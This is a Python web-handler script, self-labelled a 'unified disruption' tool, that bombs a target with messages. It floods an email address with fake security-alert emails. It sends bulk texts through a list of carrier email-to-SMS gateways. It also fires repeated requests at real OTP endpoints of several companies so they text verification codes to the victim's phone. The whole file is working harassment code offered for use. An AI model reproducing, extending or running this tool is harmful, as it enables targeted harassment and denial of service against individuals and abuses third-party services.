import os
import json
import random
import string
import time
import smtplib
import asyncio
import urllib.request
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formatdate, make_msgid
from http.server import BaseHTTPRequestHandler

# BIFROST UNIFIED DISRUPTION (v18.2)
# Consolidates Email and SMS bombing into a single endpoint.

CARRIER_GATEWAYS = {
    'att': 'txt.att.net', 'tmobile': 'tmomail.net', 'verizon': 'vtext.com',
    'sprint': 'messaging.sprintpcs.com', 'uscellular': 'email.uscc.net',
    'boost': 'sms.myboostmobile.com', 'cricket': 'sms.cricketwireless.net',
    'metro': 'mymetropcs.com', 'googlefi': 'msg.fi.google.com',
    'consumer': 'mailmymobile.net', 'virgin': 'vmobl.com',
    'republic': 'text.republicwireless.com', 'xfinity': 'vtext.com',
    'mint': 'tmomail.net', 'visible': 'vtext.com', 'straighttalk': 'vtext.com',
    'tracfone': 'mmst5.tracfone.com', 'ting': 'message.ting.com',
    'cspire': 'cspire1.com', 'spectrum': 'vtext.com'
}

ENDPOINTS = [
    {"url": "https://www.flipkart.com/api/5/user/otp/generate", "method": "POST", "payload": {"loginId": "+{TARGET}"}},
    {"url": "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", "method": "POST", "payload": {"phone": "1{TARGET}"}},
    {"url": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=en", "method": "POST", "payload": {"phone_number": "1{TARGET}"}},
    {"url": "https://youla.ru/web-api/auth/request_code", "method": "POST", "payload": {"phone": "+1{TARGET}"}}
]

def gen_email_payload(target, sender):
    msg = MIMEMultipart('alternative')
    msg['From'] = f"Support <{sender}>"
    msg['To'] = target
    msg['Subject'] = f"Security Alert #{random.randint(1000,9999)}"
    msg['Date'] = formatdate(localtime=True)
    msg['Message-ID'] = make_msgid(domain="reaper-ops.local")
    code = ''.join(random.choices(string.digits, k=6))
    html = f"<html><body><h2>Security Alert</h2><p>Your verification code is: <b>{code}</b></p></body></html>"
    msg.attach(MIMEText(f"Code: {code}", 'plain'))
    msg.attach(MIMEText(html, 'html'))
    return msg

async def send_otp(target, endpoint):
    try:
        url = endpoint["url"].replace("{TARGET}", target)
        data = json.dumps(endpoint["payload"]).replace("{TARGET}", target).encode() if endpoint["method"]=="POST" else None
        req = urllib.request.Request(url, data=data, method=endpoint["method"])
        req.add_header('Content-Type', 'application/json')
        req.add_header('User-Agent', 'Mozilla/5.0')
        with urllib.request.urlopen(req, timeout=5) as res:
            return res.getcode()
    except: return 500

class handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        try:
            cl = int(self.headers.get('Content-Length', 0))
            body = json.loads(self.rfile.read(cl))
            mode = body.get('mode', 'email')
            target = body.get('target')
            count = min(int(body.get('count', 10)), 50)

            if mode == 'email':
                res = self.email_bomb(target, count)
            elif mode in ['otp', 'sms', 'shotgun']:
                res = self.sms_disruption(target, mode, body.get('carrier'), count)
            else:
                res = {"error": "INVALID_MODE"}
            
            self._json(200, res)
        except Exception as e:
            self._json(500, {"error": str(e)})

    def email_bomb(self, target, count):
        user = os.getenv('SMTP_USER')
        pw = os.getenv('SMTP_PASS')
        sender = os.getenv('SENDER_EMAIL')
        if not all([user, pw, sender]): return {"error": "SMTP_CONFIG_MISSING"}
        
        sent = 0
        try:
            server = smtplib.SMTP(os.getenv('SMTP_HOST', 'smtp-relay.brevo.com'), 587, timeout=10)
            server.starttls()
            server.login(user, pw)
            for _ in range(count):
                msg = gen_email_payload(target, sender)
                server.sendmail(sender, [target], msg.as_string())
                sent += 1
            server.quit()
            return {"status": "complete", "sent": sent}
        except Exception as e: return {"error": str(e), "sent": sent}

    def sms_disruption(self, target, mode, carrier, count):
        if mode == 'otp':
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            tasks = [send_otp(target, random.choice(ENDPOINTS)) for _ in range(count)]
            results = loop.run_until_complete(asyncio.gather(*tasks))
            loop.close()
            return {"status": "complete", "hits": len([r for r in results if r == 200])}
        else:
            # Email-to-SMS Gateway logic
            user = os.getenv('SMTP_USER')
            pw = os.getenv('SMTP_PASS')
            sender = os.getenv('SENDER_EMAIL')
            digits = ''.join(filter(str.isdigit, target))
            gw_list = [CARRIER_GATEWAYS[carrier]] if carrier in CARRIER_GATEWAYS else list(CARRIER_GATEWAYS.values())
            
            sent = 0
            try:
                server = smtplib.SMTP(os.getenv('SMTP_HOST', 'smtp-relay.brevo.com'), 587)
                server.starttls()
                server.login(user, pw)
                for gw in gw_list:
                    for _ in range(count if carrier else 1):
                        msg = MIMEText(f"Verification Code: {random.randint(100000,999999)}")
                        msg['To'] = f"{digits}@{gw}"
                        server.sendmail(sender, [msg['To']], msg.as_string())
                        sent += 1
                server.quit()
                return {"status": "complete", "sent": sent}
            except Exception as e: return {"error": str(e), "sent": sent}

    def _json(self, code, data):
        self.send_response(code); self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*'); self.end_headers()
        self.wfile.write(json.dumps(data).encode())
